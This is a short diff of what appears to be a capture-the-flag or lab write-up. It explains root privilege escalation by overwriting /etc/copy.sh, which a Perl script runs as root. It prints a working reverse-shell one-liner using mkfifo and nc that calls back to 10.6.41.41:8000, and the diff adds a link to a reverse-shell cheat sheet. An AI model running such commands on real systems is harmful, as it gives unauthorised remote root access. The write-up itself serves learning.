@@ -119,6 +119,8 @@ system("sh", "/etc/copy.sh");
 - The script uses Perl to run /etc/copy.sh using sh. So if I can edit /etc/copy.sh, I can control what runs as root.
 
 - To get the reverse shell I ran this command first:
+
+reference: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ```
 echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.41.41 8000 > /tmp/f' > /etc/copy.sh
 ```
